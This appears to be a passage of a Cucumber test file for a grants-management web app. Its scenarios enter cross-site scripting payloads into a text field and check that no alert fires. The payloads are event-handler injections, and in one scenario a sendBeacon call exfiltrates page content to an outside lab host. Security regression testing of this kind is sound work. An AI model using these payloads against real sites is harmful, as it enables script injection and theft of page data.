      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301813 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                            | Field                  |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301814 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                               | Field                  |
      | <body onbeforeprint=console.log(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301815 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                  |
      | <xss onbeforescriptexecute=alert(1)><script>1</script> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301817 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                     | Field                  |
      | <body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301818 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                  | Field                  |
      | <svg><animate onbegin=alert(1) attributeName=x dur=1s> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301819 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                  |
      | <marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301822
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                            | Field                  |
      | <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301823 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                   | Field                  |
      | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301825 @dilip
  Scenario Outline: Admin) To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                         | Field                  |
      | <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301828 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                | Field                  |
      | <svg><animate onend=alert(1) attributeName=x dur=1s> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301831 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                  |
      | <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301833 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                        | Field                  |
      | <audio src/onerror=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301834 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                  |
      | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301834 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                   | Field                  |
      | <marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301835 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                    | Field                  |
      | <a id=x tabindex=1 onfocus=alert(1)></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301837 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                      | Field                  |
      | <a id=x tabindex=1 onfocusin=alert(1)></a> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301838 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                         | Field                  |
      | <body onhashchange="print()"> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301851 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                  | Field                  |
      | <body onload=alert(1)> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301853 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                               | Field                  |
      | <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301856 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                  |
      | <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301859 @dilip
  Scenario Outline: Admin To verify when user enters script in the text area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23579                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                    | Field                  |
      | <body onmessage=print()> | fieldAssistanceType__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
